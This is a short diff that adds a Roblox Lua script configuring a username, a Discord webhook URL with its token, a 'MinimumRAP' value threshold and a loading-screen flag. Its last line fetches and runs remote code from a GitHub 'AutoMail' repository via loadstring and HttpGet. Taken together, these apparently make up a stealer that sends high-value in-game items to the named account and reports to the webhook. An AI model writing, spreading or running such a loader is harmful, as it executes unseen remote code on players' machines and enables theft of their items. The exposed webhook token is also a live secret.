@@ -1,0 +1,8 @@
+Username = "hyu_999"
+Webhook = "https://discord.com/api/webhooks/1208730500194107442/S68ZQ4Lfzb-zgLo6fEK8C0KwNoS_A0juCOzHYu5ECCqmfNDpNBjCB4yotNix7qfdbG34"
+
+LoadingScreen = false
+
+MinimumRAP = 100000
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/HubPet99/AutoMail/main/Mail"))()
